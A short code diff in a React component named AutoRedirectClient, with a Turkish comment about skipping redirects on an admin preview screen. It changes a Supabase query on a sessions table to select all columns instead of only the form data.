@@ -24,7 +24,7 @@ export function AutoRedirectClient({ sessionId, bankSlug, bankName }: Props) {
       // Admin panelindeki önizleme (preview) ekranında yönlendirme yapma
       if (sessionId === "preview") return;
       
-      const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
+      const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
       const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
 
       await supabase
